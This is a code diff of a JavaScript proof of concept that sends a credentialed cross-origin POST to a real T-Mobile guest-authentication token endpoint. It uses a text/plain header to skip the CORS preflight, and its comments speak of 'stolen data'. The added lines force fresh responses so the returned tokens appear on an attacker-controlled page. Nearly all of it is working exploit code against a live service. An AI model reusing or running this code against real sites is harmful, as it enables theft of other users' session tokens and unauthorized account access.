@@ -1,19 +1,25 @@
-// We use text/plain to avoid the OPTIONS preflight bouncer
-fetch('https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens', {
+// Adding a random 'cache-buster' parameter ensures the server sends a fresh 200 OK
+const cacheBuster = '?v=' + Date.now();
+const target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens' + cacheBuster;
+
+fetch(target, {
     method: 'POST',
     mode: 'cors',
     credentials: 'include',
+    cache: 'no-store', // Tell the browser: "Don't look at your cache, I want fresh data"
     headers: {
-        'Content-Type': 'text/plain' // This is the secret to bypassing the OPTIONS failure
+        'Content-Type': 'text/plain',
+        'Pragma': 'no-cache',      // Older cache control
+        'Cache-Control': 'no-cache' // Modern cache control
     },
     body: '{}' 
 })
 .then(response => {
-    // If this works, we will see the stolen data even if the OPTIONS failed before
-    console.log("Stolen Headers:", response.headers.get('Access-Control-Allow-Origin'));
+    console.log("Status Code:", response.status);
     return response.json();
 })
 .then(data => {
+    // If the 200 OK works, your tokens will appear here!
     document.getElementById('output').innerText = JSON.stringify(data, null, 2);
 })
 .catch(err => {
